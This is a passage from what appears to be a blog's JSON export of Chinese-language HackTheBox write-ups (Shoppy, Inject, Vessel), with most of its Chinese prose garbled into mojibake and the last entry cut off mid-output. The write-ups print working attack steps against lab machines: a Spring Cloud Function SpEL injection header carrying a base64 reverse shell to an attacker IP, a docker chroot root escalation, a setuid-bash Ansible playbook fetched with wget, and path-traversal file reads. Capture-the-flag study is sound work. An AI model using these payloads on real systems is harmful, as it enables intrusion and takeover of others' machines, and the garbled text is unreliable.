on shoppy: (deploy) /home/deploy/password-manager å‘ç°å¯æ‰§è¡Œå‘½ä»¤/home/deploy/password-managerï¼Œç”¨å¦‚ä¸‹æ­¥éª¤ä¸‹è½½åˆ°æœ¬åœ° åœ¨sshçª—å£å¼€å¯httpæœåŠ¡ jaeger@shoppy:/home/deploy$ python3 -m http.server 9898 Serving HTTP on 0.0.0.0 port 9898 (http://0.0.0.0:9898/) ... ç„¶ååœ¨æœ¬åœ°ç”¨å¦‚ä¸‹å‘½ä»¤ä¸‹è½½ wget http://10.129.93.16:9898/password-manager æœ¬åœ°ç”¨fileå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# file password-manager password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped æ˜¯64ä½ELFï¼ˆExecutable and Linkable Formatï¼‰æ–‡ä»¶ å››ã€é€†å‘åˆ†æç”¨radare2å·¥å…·é€†å‘é™æ€åˆ†æä¸€ä¸‹ å‚è€ƒï¼šhttps://blog.csdn.net/qq_28429161/article/details/107810534 r2 password-manager è¾“å…¥å¦‚ä¸‹æŒ‡ä»¤ï¼Œå®šä½mainå‡½æ•°åœ°å€ &gt; aaa #è‡ªåŠ¨åˆ†æå¹¶å‘½åå‡½æ•° &gt; afl #æŸ¥çœ‹ç¨‹åºå†…çš„å‡½æ•° æ‰¾åˆ°mainå‡½æ•°ï¼Œç„¶åå®šä½åˆ°mainå‡½æ•°çš„åœ°å€å¹¶æŸ¥çœ‹æ±‡ç¼–ä»£ç  &gt; s main //å®šä½åˆ°mainå‡½æ•°å…¥å£ &gt; pdf //æŸ¥çœ‹å½“å‰å‡½æ•°çš„æ±‡ç¼–ä»£ç  å¦‚ä¸Šå›¾ï¼Œint main()å’ŒåŸŸè¿ç®—ç¬¦::è¡¨æ˜è¿™æ˜¯C++ç¨‹åºï¼Œè¿è¡Œä¼šå…ˆæ‰“å°Welcome to Josh password manager! ç„¶åæ‰“å°Please enter your master password: ï¼Œå¹¶æ¥æ”¶é”®ç›˜è¾“å…¥ï¼Œå¦‚ä¸‹å›¾ ç„¶åå°†é”®ç›˜è¾“å…¥ä¸Sampleé€ä¸€å­—ç¬¦å¯¹æ¯” å¯¹æ¯”ç›¸åŒåï¼Œä¼šæ‰“å°Access granted! Here is creds !ï¼Œç„¶åè°ƒç”¨system()å‡½æ•°æ‰§è¡Œcatå‘½ä»¤ï¼ŒæŸ¥çœ‹/home/deploy/creds.txtå†…å®¹ å›åˆ°é¶æœºsshçª—å£ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œæç¤ºPlease enter your master password:æ—¶ï¼Œè¾“å…¥Sample jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager [sudo] password for jaeger: Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! å¯çœ‹åˆ°å·²å¾—åˆ°è´¦æˆ·deployçš„ç”¨æˆ·åå¯†ç ï¼Œæ‰§è¡Œsu deployåˆ‡æ¢åˆ°deployè´¦æˆ· çœ‹åˆ°deployç”¨æˆ·å±äºdockerç»„ï¼Œåœ¨å¦‚ä¸‹ç½‘ç«™æœç´¢docker https://gtfobins.github.io/ äº”ã€dockerææƒçœ‹åˆ°å¦‚ä¸‹ææƒå‘½ä»¤ ä¸ºäº†è®©è·å¾—çš„shellç¯å¢ƒæ›´ç¨³å®šï¼ŒæŠŠåé¢çš„shæ¢æˆbashï¼Œæ‰§è¡Œ deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash æˆåŠŸè·å–rootæƒé™ Overï¼ å‚è€ƒhttps://blog.csdn.net/qq_45894840/article/details/127527914 https://0xdf.gitlab.io/2023/01/14/htb-shoppy.html","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Inject","slug":"HTB8-Inject","date":"2023-04-03T13:04:00.000Z","updated":"2023-04-07T00:48:26.849Z","comments":true,"path":"posts/89e1a3f1.html","link":"","permalink":"https://wa0er.github.io/posts/89e1a3f1.html","excerpt":"","text":"HTB-Injectä¸€ã€æ€è·¯æ¦‚è¦ ç«¯å£æ‰«æå‘ç°8080é¡µé¢å­˜åœ¨ä¸Šä¼ ç‚¹ï¼› ä¸Šä¼ æ–‡ä»¶è·¯å¾„å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼› æœ¬åœ°æ–‡ä»¶åŒ…å«è¯»å–ç«™ç‚¹pom.xmlæ–‡ä»¶å‘ç°Spring Cloud Functionç‰ˆæœ¬å­˜åœ¨SpELæ³¨å…¥ï¼› SpELæ³¨å…¥åå¼¹shellè·å–frankç”¨æˆ·æƒé™ï¼› frankç”¨æˆ·ç›®å½•ä¿¡æ¯æ³„éœ²è·å–philç”¨æˆ·ï¼› philç”¨æˆ·è‡ªåŠ¨ä»»åŠ¡Ansible Playbookææƒè·å–rootæƒé™ã€‚ äºŒã€ä¿¡æ¯æ”¶é›†Nmap â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -p- --min-rate 10000 10.10.11.204 Starting Nmap 7.91 ( https://nmap.org ) at 2023-04-03 02:45 EDT Nmap scan report for 10.10.11.204 Host is up (7.6s latency). Not shown: 53331 filtered ports, 12202 closed ports PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 49.25 seconds â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sCV -p 22,8080 10.10.11.204 Starting Nmap 7.91 ( https://nmap.org ) at 2023-04-03 02:50 EDT Nmap scan report for 10.10.11.204 Host is up (0.37s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA) | 256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA) |_ 256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519) 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.02 seconds å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ã€8080ï¼ˆhttp-proxyï¼‰ è®¿é—®8080ç«¯å£ ç‚¹å‡»å³ä¸Šè§’Uploadï¼Œå­˜åœ¨ä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ phpæ–‡ä»¶æç¤ºOnly image files are accepted! å†æ¬¡ä¸Šä¼ ï¼ŒåŒæ—¶BurpæŠ“åŒ…ï¼Œä¿®æ”¹è¯·æ±‚åŒ…ä¸¤å¤„filename=\"1.jpg\"ã€Content-Type: image/jpegï¼ŒæˆåŠŸä¸Šä¼ ï¼Œå“åº”è¿”å›è·¯å¾„/show_image?img=1.jpg ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰æµè§ˆå™¨è®¿é—®http://10.10.11.204:8080/show_image?img=1.jpgï¼ŒåŒæ—¶æŠ“åŒ…ï¼Œä¿®æ”¹img=../../../æµ‹è¯•LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰ï¼Œå¯çœ‹åˆ°å“åº”è¿”å›ç›®å½•æ–‡ä»¶ï¼Œç¡®å®šå­˜åœ¨LFI æ–‡ä»¶åŒ…å«ï¼šhttps://www.freebuf.com/articles/web/277756.html éå†å‘ç°img=../../../../../../æ˜¯æ ¹ç›®å½•ï¼Œimg=../../../å°±æ˜¯Webé¡µé¢æ ¹ç›®å½•ï¼ˆæˆ–img=../../../../../../var/www/WebAppï¼‰ è¯»å–pom.xmlæ–‡ä»¶ &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.5&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;WebApp&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;WebApp&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;11&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.sun.activation&lt;/groupId&gt; &lt;artifactId&gt;javax.activation&lt;/artifactId&gt; &lt;version&gt;1.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt; &lt;version&gt;3.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;bootstrap&lt;/artifactId&gt; &lt;version&gt;5.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${parent.version}&lt;/version&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;finalName&gt;spring-webapp&lt;/finalName&gt; &lt;/build&gt; &lt;/project&gt; å››ã€CVE-2022-22963ï¼ˆSpring Cloud Function SpELæ³¨å…¥ï¼‰å…³é”®ä»£ç å¦‚ä¸‹ï¼Œç‰ˆæœ¬3.2.2ï¼Œå­˜åœ¨Spring Cloud Function SpEL ä»£ç æ³¨å…¥ï¼ˆCVE-2022-22963ï¼‰ åˆ†æï¼šhttps://www.anquanke.com/post/id/280278 åˆ©ç”¨ï¼šhttps://blog.csdn.net/qq_44842234/article/details/125845459 &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt; &lt;version&gt;3.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; åˆ©ç”¨æ–¹æ³•1 åœ¨å¦‚ä¸‹ç½‘ç«™å¡«å†™åå¼¹shellå‘½ä»¤ï¼Œå¾—åˆ°base64å¤„ç†åçš„å‘½ä»¤ https://bewhale.github.io/tools/encode.html å…ˆæœ¬åœ°æ‰§è¡Œnc -lvnp 9898å¼€å¯ncç›‘å¬ æµè§ˆå™¨è®¿é—®http://10.10.11.204:8080/functionRouterï¼ŒåŒæ—¶BurpæŠ“åŒ…ï¼ŒSend to Repeaterä¹‹ååœ¨Reapeterå³é”®é€‰æ‹©Change request methodï¼Œæ­¤æ—¶GETè¯·æ±‚å˜æˆPOSTè¯·æ±‚ï¼Œç„¶åæ·»åŠ å¦‚ä¸‹è¯·æ±‚å¤´ï¼Œå‘åŒ… spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Lzk4OTggMD4mMQ==}|{base64,-d}|{bash,-i}\") æˆåŠŸåå¼¹shellï¼Œè·å–frankç”¨æˆ·æƒé™ åˆ©ç”¨æ–¹æ³•2 ä¸‹è½½åˆ©ç”¨è„šæœ¬åˆ°æœ¬åœ° åˆ©ç”¨è„šæœ¬ï¼šhttps://github.com/chaosec2021/EXP-POC/tree/main/Spring-cloud-function-SpEL-RCE å…ˆæœ¬åœ°æ‰§è¡Œnc -lvnp 9898å¼€å¯ncç›‘å¬ æœ¬åœ°æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ python3 Spel_RCE_Bash_EXP.py http://10.10.11.204:8080 10.10.16.9 9898 æˆåŠŸåå¼¹shellï¼Œè·å–frankç”¨æˆ·æƒé™ ç”¨å¦‚ä¸‹findå‘½ä»¤æŸ¥çœ‹frankå±ç»„çš„æ–‡ä»¶ï¼Œä¸”è¿‡æ»¤æ‰å¸¦æœ‰procå­—ç¬¦ä¸²çš„è¡Œï¼ˆå› ä¸º/procç›®å½•ä¸‹å¤ªå¤šæ— ç”¨çš„ç›¸å…³æ–‡ä»¶ï¼‰ frank@inject:/$ find / -group frank -type f 2&gt;/dev/null | grep -v \"proc\" find / -group frank -type f 2&gt;/dev/null | grep -v \"proc\" /tmp/XvFlf /tmp/CmMlc /tmp/JYiHo.b64 /tmp/hsperfdata_frank/824 /tmp/YGqfV.b64 /tmp/KpLRF.b64 /tmp/gotRCEbutCANTrevSHELL.aaaaaa /tmp/CkFZS /tmp/shell.sh /home/frank/.bashrc /home/frank/.m2/settings.xml /home/frank/.cache/motd.legal-displayed /home/frank/.profile åœ¨/home/frank/.m2/settings.xmlçœ‹åˆ°philè´¦æˆ· frank@inject:/$ cat /home/frank/.m2/settings.xml cat /home/frank/.m2/settings.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;settings xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;Inject&lt;/id&gt; &lt;username&gt;phil&lt;/username&gt; &lt;password&gt;DocPhillovestoInject123&lt;/password&gt; &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt; &lt;filePermissions&gt;660&lt;/filePermissions&gt; &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt; &lt;configuration&gt;&lt;/configuration&gt; &lt;/server&gt; &lt;/servers&gt; &lt;/settings&gt; phil DocPhillovestoInject123 æ‰§è¡Œsu philåˆ‡æ¢åˆ°philè´¦æˆ·ï¼ˆè¾“å…¥å¯†ç å›è½¦ä¹‹åå°±æ˜¯philç”¨æˆ·äº†ï¼‰ frank@inject:/$ su phil su phil Password: DocPhillovestoInject123 id uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff) pwd / ä¸‹è½½linpeas.shåˆ°æœ¬åœ°ï¼šhttps://github.com/carlospolop/PEASS-ng/tree/master/linPEAS æœ¬åœ°å¼€å¯httpæœåŠ¡ python3 -m http.server 80 philç”¨æˆ·çª—å£æ‰§è¡Œwget http://10.10.16.9/linpeas.shï¼Œä»æœ¬åœ°ä¼ è¾“linpeas.shåˆ°é¶æœº æ·»åŠ å¯æ‰§è¡Œæƒé™ chmod 777 linpeas.sh äº”ã€Ansible Playbookææƒæ‰§è¡Œ./linpeas.shï¼Œçœ‹åˆ°å¦‚å›¾è‡ªåŠ¨ä»»åŠ¡playbook_1.yml æŸ¥çœ‹æ–‡ä»¶å†…å®¹ ls -la /opt/automation/tasks/playbook_1.yml -rw-r--r-- 1 root root 150 Apr 3 11:36 /opt/automation/tasks/playbook_1.yml cat /opt/automation/tasks/playbook_1.yml - hosts: localhost tasks: - name: Checking webapp service ansible.builtin.systemd: name: webapp enabled: yes state: started googleæœç´¢ï¼Œæ˜¯ansible playbookï¼Œç”±äºé¶æœºshellç¯å¢ƒç¼–è¾‘æ–‡ä»¶ä¸æ–¹ä¾¿ï¼Œæœ¬åœ°ç¼–è¾‘getshell.ymlï¼Œå†…å®¹å¦‚ä¸‹ - hosts: localhost tasks: - name: getshell command: chmod u+s /bin/bash become: true å›åˆ°é¶æœºï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†æ–‡ä»¶ä»æœ¬åœ°ä¼ è¾“åˆ°é¶æœº/opt/automation/tasks/ç›®å½•ä¸‹ï¼ˆè®°å¾—æœ¬åœ°å¼€httpæœåŠ¡ï¼‰ cd /opt/automation/tasks/ wget http://10.10.16.9/getshell.yml ç¨ç­‰ç‰‡åˆ»ï¼Œè‡ªåŠ¨ä»»åŠ¡æ‰§è¡Œåï¼ŒæŸ¥çœ‹/bin/bashå·²è®¾ç½®suidï¼Œæ‰§è¡Œbash -pï¼ŒæˆåŠŸè·å–rootæƒé™ Overï¼ å‚è€ƒhttps://blog.csdn.net/qq_58869808/article/details/129505388 https://www.0le.cn/archives/55.html","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Vessel","slug":"HTB7-Vessel","date":"2023-03-29T02:50:00.000Z","updated":"2023-03-29T03:04:33.228Z","comments":true,"path":"posts/7c3ddaa9.html","link":"","permalink":"https://wa0er.github.io/posts/7c3ddaa9.html","excerpt":"","text":"HTB-Vesselä¸€ã€æ€è·¯æ¦‚è¦ ä¿¡æ¯æ”¶é›†å‘ç°Gitä¿¡æ¯æ³„éœ²ï¼› åˆ†æGitä¿¡æ¯å‘ç°Nodejs-SQLæ³¨å…¥ï¼› Nodejs-SQLæ³¨å…¥ä»¥adminèº«ä»½ç™»å½•ä¸»ç«™ï¼› ä¸»ç«™æºç å‘ç°openwebanalyticså­åŸŸï¼› Googleå‘ç°OpenWebAnalyticså­˜åœ¨CVE-2022-24637ï¼› CVE-2022-24637ä»¥adminèº«ä»½ç™»å½•openwebanalyticså­åŸŸå¹¶è·å–www-dataç”¨æˆ·shellï¼› /home/stevenå‘ç°å¯ç–‘åŠ å¯†PDFæ–‡ä»¶å’Œå¯†ç ç”Ÿæˆç¨‹åºï¼› Pythonåç¼–è¯‘å¯†ç ç”Ÿæˆç¨‹åºç ´è§£PDFå¯†ç è·å–SSHç”¨æˆ·å¯†ç ï¼› ç™»å½•SSHç”¨æˆ·æŸ¥è¯¢æ‹¥æœ‰suidæƒé™çš„æ–‡ä»¶å‘ç°CVE-2022-0811ï¼› CVE-2022-0811å†…æ ¸ææƒè·å–rootç”¨æˆ·æƒé™ã€‚ äºŒã€ä¿¡æ¯æ”¶é›†nmapæ‰«ç«¯å£ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sC -sV 10.10.11.178 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-20 21:58 EDT Nmap scan report for 10.10.11.178 Host is up (0.78s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 (RSA) | 256 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d (ECDSA) |_ 256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Vessel |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.56 seconds å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ã€80ï¼ˆhttpï¼‰ æµè§ˆå™¨è®¿é—®IPï¼Œé¡µé¢å¦‚ä¸‹ ffufæšä¸¾å­ç›®å½• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,301 -u http://10.10.11.178/FUZZ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.178/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,301 ________________________________________________ [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 576ms] * FUZZ: dev [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 4584ms] * FUZZ: css [Status: 200, Size: 2393, Words: 999, Lines: 52, Duration: 525ms] * FUZZ: 404 [Status: 200, Size: 4213, Words: 1929, Lines: 71, Duration: 288ms] * FUZZ: login [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 884ms] * FUZZ: js [Status: 200, Size: 5830, Words: 3040, Lines: 90, Duration: 2728ms] * FUZZ: register [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 2683ms] * FUZZ: img [Status: 200, Size: 2335, Words: 991, Lines: 52, Duration: 302ms] * FUZZ: 500 [Status: 200, Size: 15030, Words: 5599, Lines: 244, Duration: 301ms] * FUZZ: [Status: 200, Size: 3637, Words: 1604, Lines: 64, Duration: 374ms] * FUZZ: reset [Status: 200, Size: 2400, Words: 1029, Lines: 53, Duration: 362ms] * FUZZ: 401 :: Progress: [26584/26584] :: Job [1/1] :: 293 req/sec :: Duration: [0:01:40] :: Errors: 2 :: 301ï¼š/devã€/cssã€/jsã€/img 200ï¼š/404ã€/loginã€/registerã€/500ã€/resetã€/401 ä»¥ä¸Šç›®å½•ï¼Œåªæœ‰/devæœ€å¯èƒ½å­˜åœ¨çº¿ç´¢ï¼Œå› ä¸ºå…¶ä»–å‡ ä¸ªéƒ½æ˜¯æ¯”è¾ƒå¸¸è§„çš„åŠŸèƒ½ç‚¹ã€‚ä½†å¯¹/devç›®å½•åšæšä¸¾ï¼Œæ²¡å‘ç°ä»€ä¹ˆä¸œè¥¿ï¼Œå°±çŒœä¸€ä¸‹.gitï¼Œä½†/dev/.gitåšäº†è·³è½¬ï¼Œä¼šè·³è½¬åˆ°404ï¼Œå°±è¿›ä¸€å±‚å¯¹/dev/.git/çš„å­ç›®å½•åšæšä¸¾ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -mc 200,301 -u http://10.10.11.178/dev/.git/FUZZ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.178/dev/.git/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,301 ________________________________________________ [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 280ms] * FUZZ: info [Status: 200, Size: 2607, Words: 18, Lines: 19, Duration: 4971ms] * FUZZ: index [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 6035ms] * FUZZ: logs [Status: 301, Size: 199, Words: 7, Lines: 11, Duration: 6166ms] * FUZZ: objects [Status: 301, Size: 195, Words: 7, Lines: 11, Duration: 379ms] * FUZZ: hooks [Status: 200, Size: 139, Words: 13, Lines: 9, Duration: 7085ms] * FUZZ: config [Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 281ms] * FUZZ: description [Status: 301, Size: 201, Words: 7, Lines: 11, Duration: 262ms] * FUZZ: branches [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 279ms] * FUZZ: refs :: Progress: [63087/63087] :: Job [1/1] :: 322 req/sec :: Duration: [0:02:58] :: Errors: 0 :: ç¡®å®šå­˜åœ¨Gitä¿¡æ¯æ³„éœ² ä¸‰ã€Gitä¿¡æ¯æ³„éœ²Gitä¿¡æ¯æ³„éœ²å‚è€ƒï¼šhttps://www.freebuf.com/articles/web/318599.html ç”¨git-dumperå·¥å…·æŠŠgitç›¸å…³æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°ï¼ˆä¹Ÿå¯ä»¥ç”¨GitHackï¼‰ï¼Œæ­¤å¤„ä¸‹è½½åˆ°./Vessel/gitç›®å½•ä¸‹ pip install git-dumper git-dumper http://10.10.11.178/dev ./Vessel/git git logçœ‹ä¸€ä¸‹gitæ—¥å¿—ï¼Œçœ‹åˆ°é‚®ç®±ethan@vessel.htb â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cd Vessel/git â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/Vessel/git] â””â”€# git log commit 208167e785aae5b052a4a2f9843d74e733fbd917 (HEAD -&gt; master) Author: Ethan &lt;ethan@vessel.htb&gt; Date: Mon Aug 22 10:11:34 2022 -0400 Potential security fixes commit edb18f3e0cd9ee39769ff3951eeb799dd1d8517e Author: Ethan &lt;ethan@vessel.htb&gt; Date: Fri Aug 12 14:19:19 2022 -0400 Security Fixes commit f1369cfecb4a3125ec4060f1a725ce4aa6cbecd3 Author: Ethan &lt;ethan@vessel.htb&gt; Date: Wed Aug 10 15:16:56 2022 -0400 Initial commit ç”¨treeå‘½ä»¤çœ‹ä¸€ä¸‹æ–‡ä»¶ç›®å½•æ ‘ï¼ˆä¹Ÿå¯ç”¨GitKrakenæˆ–å…¶ä»–å®¡è®¡ç±»å·¥å…·åˆ†ægitæ–‡ä»¶ï¼‰ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# tree -a Vessel/git/ Vessel/git/ â”œâ”€â”€ config â”‚&nbsp;&nbsp; â””â”€â”€ db.js â”œâ”€â”€ .git â”‚&nbsp;&nbsp; â”œâ”€â”€ COMMIT_EDITMSG â”‚&nbsp;&nbsp; â”œâ”€â”€ config â”‚&nbsp;&nbsp; â”œâ”€â”€ description â”‚&nbsp;&nbsp; â”œâ”€â”€ HEAD â”‚&nbsp;&nbsp; â”œâ”€â”€ hooks â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ applypatch-msg.sample â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ commit-msg.sample â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ post-update.sample â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-applypatch.sample â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-commit.sample â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ prepare-commit-msg.sample â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-push.sample â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-rebase.sample â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-receive.sample â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ update.sample â”‚&nbsp;&nbsp; â”œâ”€â”€ index â”‚&nbsp;&nbsp; â”œâ”€â”€ info â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; 